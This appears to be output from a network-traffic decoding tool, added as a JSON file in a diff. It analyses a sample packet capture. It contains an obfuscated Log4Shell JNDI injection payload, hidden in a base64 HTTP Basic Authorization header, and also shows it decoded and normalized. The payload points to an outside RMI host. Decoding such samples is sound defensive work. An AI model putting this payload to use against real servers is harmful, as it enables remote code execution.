@@ -1,0 +1,39 @@
+{
+  "ok": true,
+  "input": "data\\decoded\\02_sample_packet_rmi-basic-auth-ev5_decoded.json",
+  "decision": "stop",
+  "needs_llm_review": false,
+  "completion_status": "sufficient_within_scope",
+  "reason": "Decoded candidates exist and no residue or excluded streams remain.",
+  "required_next_action": null,
+  "decoded_status": "decode_success",
+  "counts": {
+    "decoded_candidates": 1,
+    "failed_candidates": 0,
+    "residue_candidates": 0,
+    "excluded_streams": 0,
+    "checked_streams": 7,
+    "checked_segments": 32
+  },
+  "decoded_candidates_preview": [
+    {
+      "segment_no": 4,
+      "stream_key": "172.17.0.1:56876-172.17.0.4:8888-tcp",
+      "protocol": "HTTP",
+      "position": "http_header.authorization",
+      "source": "http.authorization.basic.value",
+      "candidate_type": "base64",
+      "decode_status": "success",
+      "raw": "YXR0YWNrZXI6JHske2xvd2VyOmp9JHt1cHBlcjpufSR7bG93ZXI6ZH0ke3VwcGVyOml9OiR7bG93ZXI6cn1tJHtsb3dlcjppfTovLzM0LjkxLjczLjM3OjEwOTkvZ3A5cGM3fQ==",
+      "decoded_preview": "attacker:${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://34.91.73.37:1099/gp9pc7}",
+      "normalized_payload": "attacker:${jndi:rmi://34.91.73.37:1099/gp9pc7}",
+      "residue_signals": [],
+      "nested_candidates": []
+    }
+  ],
+  "failed_candidates_preview": [],
+  "residue_candidates_preview": [],
+  "excluded_streams": [],
+  "llm_review_prompt": null,
+  "error": null
+}
